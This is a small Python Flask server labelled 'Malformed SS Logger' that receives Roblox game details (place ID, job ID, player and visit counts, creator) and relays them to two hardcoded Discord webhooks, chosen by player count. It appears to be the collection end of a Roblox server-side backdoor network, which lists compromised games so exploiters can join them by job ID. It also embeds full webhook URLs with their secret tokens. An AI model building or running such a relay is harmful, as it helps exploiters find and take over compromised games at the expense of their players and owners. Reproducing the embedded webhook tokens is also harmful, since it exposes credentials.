from flask import Flask, request
import requests

app = Flask(__name__)

WEBHOOK_SMALL = "https://discord.com/api/webhooks/1475041143552081990/Em8Df8hLd1qGVmsFhE5Lqc0T-q3qKJciA0pk7ihA0G6TWrl4cyXfPldRBhVtuf9qKsNY"
WEBHOOK_BIG = "https://discord.com/api/webhooks/1475041311273910463/FIDxmKbEJ8C65HC9sQ9ohz_RX10mSeabPvhQGKmi1cAM_S2aN539dI4FajDTlcsGD_qI"

THRESHOLD = 20

@app.route("/api/log", methods=["POST"])
def log():
    data = request.json or {}
    players = int(data.get("players", 0))
    game_id = str(data.get("id", "unknown"))
    name = data.get("name", "Без названия")
    job_id = data.get("job_id", "—")
    server_players = data.get("server_players", "?/?")
    visits = data.get("visits", "?")
    creator = data.get("creator", "?")
    
    url = f"https://www.roblox.com/games/{game_id}/" if game_id.isdigit() else "#"
    
    embed = {
        "title": name,
        "url": url,
        "color": 0x00ff00 if players <= THRESHOLD else 0xff0000,
        "fields": [
            {"name": "Игроки", "value": f"**{players}** (сервер: {server_players})", "inline": True},
            {"name": "Визиты", "value": visits, "inline": True},
            {"name": "Job ID", "value": f"```{job_id}```", "inline": False},
            {"name": "Создатель", "value": creator, "inline": True},
            {"name": "Place ID", "value": game_id, "inline": True}
        ],
        "footer": {"text": "Malformed SS Logger"},
        "timestamp": "now"
    }
    
    webhook = WEBHOOK_SMALL if players <= THRESHOLD else WEBHOOK_BIG
    
    payload = {"embeds": [embed]}
    try:
        requests.post(webhook, json=payload, timeout=5)
    except:
        pass
    
    return {"status": "ok"}, 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
